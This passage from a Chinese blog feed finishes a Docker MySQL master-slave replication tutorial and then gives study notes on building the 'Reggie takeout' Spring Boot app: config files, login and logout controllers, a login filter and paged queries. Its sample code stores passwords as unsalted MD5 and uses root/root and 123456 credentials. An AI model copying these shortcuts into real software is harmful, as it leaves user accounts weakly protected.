MYSQL_ROOT_PASSWORD=root -d mysql:5.7.25</code></pre><h3 id="4-2-修改从服务器配置文件my-cnf"><a href="#4-2-修改从服务器配置文件my-cnf" class="headerlink" title="4.2 修改从服务器配置文件my.cnf"></a>4.2 修改从服务器配置文件my.cnf</h3><pre><code class="hljs">vim /usr/local/repository/mysql/mysql-slave/conf/my.cnf</code></pre><p>配置文件内容如下： </p><pre><code class="hljs">[client]default_character_set=utf8[mysqld]collation_server = utf8_general_cicharacter_set_server = utf8## 设置server_id，同一局域网中需要唯一server_id=102## 指定不需要同步的数据库名称binlog-ignore-db=mysql  ## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用log-bin=mall-mysql-slave1-bin  ## 设置二进制日志使用内存大小（事务）binlog_cache_size=1M  ## 设置使用的二进制日志格式（mixed,statement,row）binlog_format=mixed  ## 二进制日志过期清理时间。默认值为0，表示不自动清理。expire_logs_days=7  ## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致slave_skip_errors=1062  ## relay_log配置中继日志relay_log=mall-mysql-relay-bin  ## log_slave_updates表示slave将复制事件写进自己的二进制日志log_slave_updates=1  ## slave设置为只读（具有super权限的用户除外）read_only=1</code></pre><h3 id="4-3-修改完配置后重启slave实例"><a href="#4-3-修改完配置后重启slave实例" class="headerlink" title="4.3 修改完配置后重启slave实例"></a>4.3 修改完配置后重启slave实例</h3><pre><code class="hljs">docker restart mysql-slave</code></pre><h3 id="4-4-在主数据库中查看主从同步状态"><a href="#4-4-在主数据库中查看主从同步状态" class="headerlink" title="4.4 在主数据库中查看主从同步状态"></a>4.4 在主数据库中查看主从同步状态</h3><pre><code class="hljs">show master status;</code></pre><h3 id="4-5-进入从数据库"><a href="#4-5-进入从数据库" class="headerlink" title="4.5 进入从数据库"></a>4.5 进入从数据库</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it mysql-slave <span class="hljs-regexp">/bin/</span>bash<br>mysql -uroot -proot<br></code></pre></td></tr></table></figure><h3 id="4-6-在从数据库中配置主从复制"><a href="#4-6-在从数据库中配置主从复制" class="headerlink" title="4.6 在从数据库中配置主从复制"></a>4.6 在从数据库中配置主从复制</h3><pre><code class="hljs">change master to master_host=&#39;宿主机ip&#39;, master_user=&#39;slave&#39;, master_password=&#39;123456&#39;, master_port=3307, master_log_file=&#39;mall-mysql-bin.000001&#39;, master_log_pos=617, master_connect_retry=30;## 参数说明master_host：主数据库的IP地址；master_port：主数据库的运行端口；master_user：在主数据库创建的用于同步数据的用户账号；master_password：在主数据库创建的用于同步数据的用户密码；master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；master_connect_retry：连接失败重试的时间间隔，单位为秒。</code></pre><h3 id="4-7-在从数据库中查看主从状态"><a href="#4-7-在从数据库中查看主从状态" class="headerlink" title="4.7 在从数据库中查看主从状态"></a>4.7 在从数据库中查看主从状态</h3><pre><code class="hljs">show slave status \G;</code></pre><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127211307681.png" alt="image-20221127211307681"></p><h3 id="4-8-在从数据库中开启主从同步"><a href="#4-8-在从数据库中开启主从同步" class="headerlink" title="4.8 在从数据库中开启主从同步"></a>4.8 在从数据库中开启主从同步</h3><pre><code class="hljs">start slave;</code></pre><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127211354655.png" alt="image-20221127211354655"></p><blockquote><p>注意</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127211601944.png" alt="image-20221127211601944"></p><p>这个情况是前面的</p><p><code>change master to master_host=&#39;宿主机ip&#39;, master_user=&#39;slave&#39;, master_password=&#39;123456&#39;, master_port=3307, master_log_file=&#39;mall-mysql-bin.000001&#39;, master_log_pos=617, master_connect_retry=30;</code>  &#x3D;&#x3D;<strong>宿主机ip</strong>&#x3D;&#x3D;配置出错</p><p>停止<code>Slave</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">stop</span> <span class="hljs-literal">slave</span><br></code></pre></td></tr></table></figure><p>重新<strong>4.6步骤</strong>开始</p><h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5.测试"></a>5.测试</h2><h3 id="5-1-主库新增数据"><a href="#5-1-主库新增数据" class="headerlink" title="5.1 主库新增数据"></a>5.1 主库新增数据</h3><p>主库新增</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127212405620.png" alt="image-20221127212405620"></p><p>从库完成了复制</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127212512996.png" alt="image-20221127212512996"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
      <tag>Linux</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>瑞吉外卖</title>
    <link href="/2022/11/25/%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/11/25/%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="瑞吉外卖笔记"><a class="markdownIt-Anchor" href="#瑞吉外卖笔记"></a> 瑞吉外卖笔记</h1><p><a href="https://blog.csdn.net/weixin_46906696/article/details/125040457#comments_23962173">原文链接</a></p><h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><h2 id="功能架构图"><a class="markdownIt-Anchor" href="#功能架构图"></a> 功能架构图</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/00f39dbdd7d24d88b56c10eabeecdd7d.png" alt="在这里插入图片描述" /></p><h1 id="数据库建库建表"><a class="markdownIt-Anchor" href="#数据库建库建表"></a> 数据库建库建表</h1><h2 id="表说明"><a class="markdownIt-Anchor" href="#表说明"></a> 表说明</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ee424986569f45b6a071f1556bfe10b8.png" alt="在这里插入图片描述" /></p><h1 id="开发环境"><a class="markdownIt-Anchor" href="#开发环境"></a> 开发环境</h1><h2 id="maven搭建"><a class="markdownIt-Anchor" href="#maven搭建"></a> Maven搭建</h2><p>直接创建新工程<br />继承父工程的形式来做这个，这里新建父工程<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6e78719f1b0e465e816e50584a93d39c.png" alt="在这里插入图片描述" /></p><p>​    application.yml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-comment">#应用的名称，可选</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">reggie_take_out</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">druid:</span><br>      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/reggie?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true</span><br>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br><span class="hljs-attr">mybatis-plus:</span><br>  <span class="hljs-attr">configuration:</span><br>    <span class="hljs-comment">#在映射实体或者属性时，将数据库中表名和字段名中的下划线去掉，按照驼峰命名法映射</span><br>    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span><br>  <span class="hljs-attr">global-config:</span><br>    <span class="hljs-attr">db-config:</span><br>      <span class="hljs-attr">id-type:</span> <span class="hljs-string">ASSIGN_ID</span><br></code></pre></td></tr></table></figure><p>​</p><h2 id="启动测试"><a class="markdownIt-Anchor" href="#启动测试"></a> 启动测试</h2><p>创建测试类并启动<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8f3df341f8ed469a96de5831708a5fc5.png" alt="在这里插入图片描述" /></p><h2 id="导入前端页面"><a class="markdownIt-Anchor" href="#导入前端页面"></a> 导入前端页面</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d8af2e9f8b1f4c52b8b881801c5d8c3b.png" alt="在这里插入图片描述" /></p><h3 id="导入"><a class="markdownIt-Anchor" href="#导入"></a> 导入</h3><p>在默认页面和前台页面的情况下，直接把这俩拖到resource目录下直接访问是访问不到的，因为被mvc框架拦截了<br />所以我们要编写一个映射类放行这些资源</p><h4 id="创建配置映射类"><a class="markdownIt-Anchor" href="#创建配置映射类"></a> 创建配置映射类</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/434a4b66a3534624ae8576c71d5e43ac.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ddb9c62315e74bfba369d3812b957453.png" alt="在这里插入图片描述" /></p><p>访问成功<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124213742999.png" alt="image-20221124213742999" /></p><h1 id="后台开发"><a class="markdownIt-Anchor" href="#后台开发"></a> 后台开发</h1><h2 id="数据库实体类映射"><a class="markdownIt-Anchor" href="#数据库实体类映射"></a> 数据库实体类映射</h2><p>用mybatis plus来实现逆向工程<br />这里是老版本的逆向工程</p><p>​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--mybatis-plus 代码生成器依赖--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>具体怎么玩看这里<br /><a href="https://blog.csdn.net/weixin_48678547/article/details/123379415">MP逆向工程教程</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124213823750.png" alt="image-20221124213823750" /></p><h1 id="账户操作"><a class="markdownIt-Anchor" href="#账户操作"></a> 账户操作</h1><h2 id="登陆功能"><a class="markdownIt-Anchor" href="#登陆功能"></a> 登陆功能</h2><p>前端页面<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/018840778788414d802ec5309034a30b.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7981e9e300884b3285073d4072fdd775.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/aa04438900b64014a89cbcb2115d9463.png" alt="在这里插入图片描述" /></p><p>数据库</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124213937545.png" alt="image-20221124213937545" />业务逻辑<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/257ae0d260b2430b8890d054fc72b65a.png" alt="在这里插入图片描述" /><br /><strong>这里两个字符串的比较没法用! =来实现</strong>，只能equals再取反来判断<br />直接上代码，这里没有涉及service层的操作</p><p>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request 如果登陆成功把对象放入Session中，方便后续拿取</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> employee 利用<span class="hljs-doctag">@RequestBody</span>注解来解析前端传来的Json，同时用对象来封装</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest request, <span class="hljs-meta">@RequestBody</span> Employee employee)</span> &#123;<br>    String password=employee.getPassword();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> employee.getUsername();<br>    log.info(<span class="hljs-string">&quot;登陆&quot;</span>);<br>    <span class="hljs-comment">//MD5加密</span><br>    <span class="hljs-type">MD5Util</span> <span class="hljs-variable">md5Util</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MD5Util</span>();<br>    password=MD5Util.getMD5(password);<br>    <span class="hljs-comment">//通过账户查这个员工对象，这里就不走Service层了</span><br>    LambdaQueryWrapper&lt;Employee&gt; lambdaQueryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>();<br>    lambdaQueryWrapper.eq(Employee::getUsername, username);<br>    Employee empResult=employeeService.getOne(lambdaQueryWrapper);<br>        <span class="hljs-comment">//判断用户是否存在</span><br>    <span class="hljs-keyword">if</span> (!empResult.getUsername().equals(username))&#123;<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;账户不存在&quot;</span>);<br>        <span class="hljs-comment">//密码是否正确</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!empResult.getPassword().equals(password))&#123;<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;账户密码错误&quot;</span>);<br>        <span class="hljs-comment">//员工账户状态是否正常，1状态正常，0封禁</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (empResult.getStatus()!=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;当前账户正在封禁&quot;</span>);<br>        <span class="hljs-comment">//状态正常允许登陆</span><br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        log.info(<span class="hljs-string">&quot;登陆成功，账户存入session&quot;</span>);<br>        <span class="hljs-comment">//员工id存入session，</span><br>        request.getSession().setAttribute(<span class="hljs-string">&quot;employ&quot;</span>,empResult.getId());<br>        <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">&quot;登陆成功&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="退出功能"><a class="markdownIt-Anchor" href="#退出功能"></a> 退出功能</h2><p>点击退出<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/09194dda97404a7db7a4438d056df2b6.png" alt="在这里插入图片描述" /><br />删除session对象</p><p>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request 删除request作用域中的session对象，就按登陆的request.getSession().setAttribute(&quot;employ&quot;,empResult.getId());删除employee就行</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@PostMapping(&quot;/logout&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-comment">//尝试删除</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        request.getSession().removeAttribute(<span class="hljs-string">&quot;employ&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-comment">//删除失败</span><br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;登出失败&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">&quot;登出成功&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="完善登陆添加过滤器"><a class="markdownIt-Anchor" href="#完善登陆添加过滤器"></a> 完善登陆（添加过滤器）</h2><p>这里的话用户直接url+资源名可以随便访问，所以要加个拦截器，没有登陆时，不给访问，自动跳转到登陆页面<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/470f1c39f58f4cb09ee3878195622ca1.png" alt="在这里插入图片描述" /><br />过滤器配置类注解<code>@WebFilter(filterName=&quot;拦截器类名首字母小写&quot;，urlPartten=“要拦截的路径，比如/*”)</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/4cf893fe589242eba9be0c206389bc18.png" alt="在这里插入图片描述" />判断用户的登陆状态这块之前因为存入session里面有一个名为employee的对象，那么只需要看看这个session还在不在就知道他是否在登陆状态<br />注意，想存或者想获取的话，就都得用<code>HttpServletRequest</code>的对象来进行获取，别的request对象拿不到的</p><p>这里提一嘴<br />调用Spring核心包的字符串匹配类的对象，对路径进行匹配，并且返回比较结果<br />如果相等就为true</p><p><code>public static final AntPathMatcher PATH_MATCHER = new AntPathMatcher();</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a4e9e841bb7c43179bbcb2905d172a2c.png" alt="在这里插入图片描述" /><br />前端拦截器完成跳转到登陆页面，不在后端做处理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f0a1667cce664c35b64925c48dfb59f0.png" alt="在这里插入图片描述" /></p><p>拦截了，但是页面跳转不了。浏览器缓存原因。<code>Ctrl+F5</code>强制刷新</p><blockquote><p>这里可能有个疑问</p></blockquote><p><strong>urls</strong>中有<code>&quot;/backend/**&quot;,</code>，就是把<mark>backend</mark>目录下全部资源进行了放行，为什么访问 <strong><a href="http://localhost:8080/backend/index.html">http://localhost:8080/backend/index.html</a></strong>还是不行。</p><p>原因：</p><ul><li>​<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124214922289.png" alt="image-20221124214922289" /></li><li>访问该页面，自动发送Ajax请求。该请求不允许未登录就访问。既被拦截</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124215131587.png" alt="image-20221124215131587" /></li><li>前端拦截器进行了页面的跳转,（因为是Ajax请求，后端直接跳转好像是不行的。）</li></ul><h2 id="新增员工"><a class="markdownIt-Anchor" href="#新增员工"></a> 新增员工</h2><p>新增员工功能，（前端对手机号和身份证号长度做了一个校验）<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/966dd380180a47018ed362e125406271.png" alt="在这里插入图片描述" /><br />请求 URL: <a href="http://localhost:9001/employee">http://localhost:9001/employee</a> （POST请求）<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8bae2348243f4d0ebe58ce97aff511d3.png" alt="在这里插入图片描述" /><br />改造一下Employee实体类，通用id雪花自增算法来新增id<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124215527273.png" alt="image-20221124215527273" /></p><h2 id="全局异常处理"><a class="markdownIt-Anchor" href="#全局异常处理"></a> 全局异常处理</h2><p>先看看这种代码的try catch<br />这种try catch来捕获异常固然好， <strong>但是 ，代码量一大起来，超级多的try catch就会很乱</strong><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/232dfeaca28f420cb0fd5fae01f4ce15.png" alt="在这里插入图片描述" /><br />所以我们要加入全局异常处理，在Common包下，和Result同级，这里只是示例，并不完整<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b8da6a3931714deeb724381c0ad2da41.png" alt="在这里插入图片描述" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/33fe7337e5464cf9b07a7f0a31f67a04.png" alt="在这里插入图片描述" /><br />当报错信息出现Duplicate entry时，就意味着新增员工异常了<br />所以，我们对异常类的方法进行一些小改动，让这个异常反馈变得更人性化<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b795bb06e106477192795c9fa56e15fa.png" alt="在这里插入图片描述" /><br />这个时候再来客户端试试，就会提供人性化的报错，非常的快乐~<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/39454913ca2a48778c8c25281a03ff06.png" alt="在这里插入图片描述" /><br /><strong>这回再回到Controller ，这时就不需要再来try catch这种形式了，不用管他，因为一旦出现错误就会被我们的AOP捕获。所以，不需要再用try<br />catch来抓了</strong><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0e1e9a3feb7c4b7c8bfa1dc61286437f.png" alt="在这里插入图片描述" /></p><h2 id="员工信息分页查询"><a class="markdownIt-Anchor" href="#员工信息分页查询"></a> 员工信息分页查询</h2><h3 id="接口分析"><a class="markdownIt-Anchor" href="#接口分析"></a> 接口分析</h3><p>老生常谈分页查询了<br />需求<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3899bbef468e4224b6b26fa6a13e103c.png" alt="在这里插入图片描述" /><br />分页请求接口<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/288dd9777c1944d195cb421038fbc885.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3b9f9ddf4a304f44923ef89fa9b22ca7.png" alt="在这里插入图片描述" /><br />查询员工及显示接口<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cc0e4ee9f4b14b8d9e2c12428471889d.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e339d98a293a43c19d3c6a6252da428b.png" alt="在这里插入图片描述" /><br />逻辑流程<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/50fa6620581044c69049028b6921f72e.png" alt="在这里插入图片描述" /></p><h3 id="分页插件配置类"><a class="markdownIt-Anchor" href="#分页插件配置类"></a> 分页插件配置类</h3><p>加入配置类<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/928faf96126040248a6c7629433b8f4a.png" alt="在这里插入图片描述" /></p><h3 id="接口设计"><a class="markdownIt-Anchor" href="#接口设计"></a> 接口设计</h3><p>前端注意事项<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0e4186ba7e804ab6b1b3c6b2a3f1ce05.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/eae2123e010e4d048e3b5a1339cf41ce.png" alt="在这里插入图片描述" /><br />page对象内部<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/87eab00f37584a51bcee03f83d665e32.png" alt="在这里插入图片描述" /><br />里面包含了查询构造器的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 员工信息分页查询</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> page     int</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> pageSize int</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> name     java.lang.String</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span> com.xyy.reggie.common.R&lt;com.baomidou.mybatisplus.extension.plugins.pagination.Page&gt;</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-meta">@GetMapping(&quot;/page&quot;)</span><br>   <span class="hljs-keyword">public</span> R&lt;Page&gt; <span class="hljs-title function_">page</span><span class="hljs-params">(<span class="hljs-type">int</span> page, <span class="hljs-type">int</span> pageSize, String name)</span> &#123;<br>       log.info(<span class="hljs-string">&quot;page = &#123;&#125;,pageSize = &#123;&#125;,name = &#123;&#125;&quot;</span>, page, pageSize, name);<br><br>       <span class="hljs-comment">//构造分页构造器</span><br>       <span class="hljs-type">Page</span> <span class="hljs-variable">pageInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(page, pageSize);<br><br>       <span class="hljs-comment">//构造条件构造器</span><br>       LambdaQueryWrapper&lt;Employee&gt; queryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>();<br>       <span class="hljs-comment">//添加过滤条件</span><br>       queryWrapper.like(StringUtils.isNotEmpty(name), Employee::getName, name);<br>       <span class="hljs-comment">//添加排序条件</span><br>       queryWrapper.orderByDesc(Employee::getUpdateTime);<br><br>       <span class="hljs-comment">//执行查询</span><br>       employeeService.page(pageInfo, queryWrapper);<br><br>       <span class="hljs-keyword">return</span> R.success(pageInfo);<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>​</p><h2 id="启用-禁用员工账号"><a class="markdownIt-Anchor" href="#启用-禁用员工账号"></a> 